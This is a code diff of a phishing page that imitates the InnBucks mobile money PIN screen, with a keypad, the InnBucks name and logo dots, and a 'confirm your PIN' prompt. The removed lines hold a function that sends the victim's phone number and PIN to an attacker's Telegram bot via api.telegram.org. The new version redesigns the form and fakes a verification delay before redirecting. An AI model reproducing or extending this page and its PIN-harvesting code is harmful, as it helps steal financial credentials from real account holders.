@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>InnBucks | Enter PIN</title>
+<title>Enter PIN</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <style>
@@ -16,25 +16,25 @@
 body{
   background:#1f2235;
   min-height:100vh;
+  color:#fff;
   display:flex;
   justify-content:center;
-  color:#fff;
 }
 
 .container{
   width:100%;
   max-width:380px;
-  padding:25px 20px;
+  padding:35px 20px 120px;
   text-align:center;
 }
 
-/* Logo */
+/* LOGO */
 .logo{
   display:flex;
   justify-content:center;
   align-items:center;
   gap:10px;
-  margin-bottom:30px;
+  margin-bottom:35px;
 }
 
 .dots{
@@ -43,104 +43,105 @@ body{
   gap:5px;
 }
 
-.dot{
-  width:14px;
-  height:14px;
-  border-radius:50%;
-}
+.dot{width:14px;height:14px;border-radius:50%}
+.dot1{background:#ffb300}
+.dot2{background:#8e24aa}
+.dot3{background:#43a047}
+.dot4{background:#e53935}
 
-.dot1{background:#ffb300;}
-.dot2{background:#8e24aa;}
-.dot3{background:#43a047;}
-.dot4{background:#e53935;}
-
-.logo h2{
-  font-weight:600;
-}
-
-/* Header */
-.header{
-  display:flex;
-  align-items:center;
-  gap:10px;
-  margin-bottom:25px;
-}
-
-.back{
-  font-size:22px;
-  cursor:pointer;
-}
-
-/* Title */
-h1{
+/* TEXT */
+h2{
   font-size:22px;
   margin-bottom:10px;
 }
 
 .sub{
+  color:#cbd5f5;
+  font-size:14px;
+  margin-bottom:35px;
+}
+
+/* INPUT */
+.field{
+  text-align:left;
+  margin-bottom:14px;
+}
+
+label{
   font-size:14px;
   color:#ccc;
-  margin-bottom:40px;
 }
 
-/* PIN dots */
 .pin-box{
   display:flex;
-  justify-content:center;
-  gap:18px;
-  margin-bottom:40px;
+  align-items:center;
+  border-bottom:1px solid #aaa;
+  padding:8px 0;
 }
 
-.pin-dot{
-  width:16px;
-  height:16px;
-  border-radius:50%;
-  border:2px solid #fff;
-  background:transparent;
-  transition:.3s;
+.pin-box input{
+  flex:1;
+  background:none;
+  border:none;
+  color:#fff;
+  font-size:16px;
+  outline:none;
 }
 
-.pin-dot.filled{
-  background:#fff;
-}
-
-/* Keypad */
-.keypad{
-  display:grid;
-  grid-template-columns:repeat(3,1fr);
-  gap:18px;
-}
-
-.key{
-  background:#2a2f4a;
-  padding:18px;
-  border-radius:14px;
-  font-size:18px;
+.eye{
   cursor:pointer;
-  transition:.2s;
+  font-size:18px;
+  opacity:.8;
 }
 
-.key:active{
-  transform:scale(.95);
-  background:#3a4170;
+/* FORGOT */
+.forgot{
+  color:#4dabf7;
+  margin-top:10px;
+  cursor:pointer;
 }
 
-.key.empty{background:transparent;cursor:default}
-
-/* Button */
+/* FOOTER */
 .footer-btn{
-  margin-top:35px;
+  position:fixed;
+  bottom:20px;
+  left:50%;
+  transform:translateX(-50%);
+  width:100%;
+  max-width:380px;
+  padding:0 20px;
 }
 
 button{
   width:100%;
   background:#355d8c;
   border:none;
-  padding:14px;
+  padding:15px;
   border-radius:10px;
   color:#fff;
   font-size:16px;
-  cursor:pointer;
+  transition:.3s;
+}
+
+button.loading{
+  transform:scale(.97);
+  opacity:.85;
+}
+
+/* LOADER */
+.loader{
+  display:none;
+  width:18px;
+  height:18px;
+  border:3px solid #fff;
+  border-top:3px solid transparent;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+  margin:auto;
+}
+
+@keyframes spin{
+  to{transform:rotate(360deg)}
 }
 </style>
 </head>
@@ -156,101 +157,60 @@ button{
       <div class="dot dot3"></div>
       <div class="dot dot4"></div>
     </div>
-    <h2>InnBucks</h2>
+    <h3>InnBucks</h3>
   </div>
 
-  <div class="header">
-    <div class="back" onclick="history.back()">←</div>
+  <h2>Hello, <span id="username">User</span></h2>
+  <div class="sub">Please enter your PIN to sign in.</div>
+
+  <div class="field">
+    <label>Enter PIN</label>
+
+    <div class="pin-box">
+      <input type="password" id="pin" maxlength="4" inputmode="numeric" placeholder="****">
+      <div class="eye" onclick="toggle()">👁</div>
+    </div>
   </div>
 
-  <h1>Enter your PIN</h1>
-  <div class="sub">For your security, please confirm your PIN</div>
-
-  <!-- PIN dots -->
-  <div class="pin-box">
-    <div class="pin-dot"></div>
-    <div class="pin-dot"></div>
-    <div class="pin-dot"></div>
-    <div class="pin-dot"></div>
-  </div>
-
-  <!-- Keypad -->
-  <div class="keypad">
-    <div class="key" onclick="addPin(1)">1</div>
-    <div class="key" onclick="addPin(2)">2</div>
-    <div class="key" onclick="addPin(3)">3</div>
-
-    <div class="key" onclick="addPin(4)">4</div>
-    <div class="key" onclick="addPin(5)">5</div>
-    <div class="key" onclick="addPin(6)">6</div>
-
-    <div class="key" onclick="addPin(7)">7</div>
-    <div class="key" onclick="addPin(8)">8</div>
-    <div class="key" onclick="addPin(9)">9</div>
-
-    <div class="key empty"></div>
-    <div class="key" onclick="addPin(0)">0</div>
-    <div class="key" onclick="removePin()">⌫</div>
-  </div>
-
-  <div class="footer-btn">
-    <button onclick="verifyPin()">Continue</button>
-  </div>
+  <div class="forgot">Forgot PIN?</div>
 
 </div>
 
+<!-- VERIFY -->
+<div class="footer-btn">
+  <button id="btn" onclick="verify()">
+    <span id="txt">Verify</span>
+    <div class="loader" id="load"></div>
+  </button>
+</div>
+
 <script>
-function sendToBackend(phone, pin){
-  fetch("https://yourdomain.com/send-telegram",{
-    method:"POST",
-    headers:{ "Content-Type":"application/json" },
-    body:JSON.stringify({ message })
-  });
+// LOAD NAME
+document.getElementById("username").innerText =
+ localStorage.getItem("fullName") || "User";
+
+// TOGGLE
+function toggle(){
+  let i=document.getElementById("pin");
+  i.type = i.type==="password" ? "text":"password";
 }
 
-let pin = "";
-
-function addPin(num){
-  if(pin.length < 4){
-    pin += num;
-    updateDots();
-  }
-}
-
-function removePin(){
-  pin = pin.slice(0, -1);
-  updateDots();
-}
-
-function updateDots(){
-  let dots = document.querySelectorAll(".pin-dot");
-  dots.forEach(d => d.classList.remove("filled"));
-  for(let i = 0; i < pin.length; i++){
-    dots[i].classList.add("filled");
-  }
-}
-
-function sendPinToTelegram(phone, pin) {
-  const msg = `📱 Phone: ${phone}\n🔒 PIN: ${pin}`;
-  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: msg
-    })
-  });
-}
-
-function verifyPin(){
-  if(pin.length < 4){
+// VERIFY
+function verify(){
+  let pin=document.getElementById("pin").value;
+  if(pin.length<4){
     alert("Enter full PIN");
     return;
   }
-  let phone = localStorage.getItem("userPhone") || "N/A";
-  sendPinToTelegram(phone, pin).then(() => {
-    window.location.href = "success.html";
-  });
+
+  let b=document.getElementById("btn");
+  b.classList.add("loading");
+  document.getElementById("txt").style.display="none";
+  document.getElementById("load").style.display="block";
+
+  setTimeout(()=>{
+    window.location.href="success.html";
+  },1500);
 }
 </script>
 
